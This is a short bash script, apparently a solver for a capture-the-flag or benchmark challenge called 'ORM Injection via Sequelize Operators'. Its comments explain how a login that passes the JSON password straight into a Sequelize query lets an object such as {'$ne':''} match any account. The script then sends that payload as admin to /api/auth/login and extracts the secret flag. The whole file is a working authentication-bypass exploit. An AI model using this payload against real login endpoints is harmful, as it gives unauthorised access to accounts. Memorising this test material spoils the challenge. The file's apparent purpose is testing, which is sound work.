#!/usr/bin/env bash
# APEX-032-25 — "ORM Injection via Sequelize Operators" (tags: orm, sequelize)
#
# An ORM parameterises values; it does not decide which of them are values.
# `findOne({ where: { username, password } })` takes the password straight from
# the JSON body, and Sequelize reads an object there as an operator: `{$ne:""}`
# becomes `password != ''`, which is true of every account. The admin row
# carries `secret_flag`, and the login response prints it.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex032-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/auth/login \
    --set header.Content-Type=application/json \
    --set json.username=admin \
    --set 'json.password={"$ne":""}' | flag
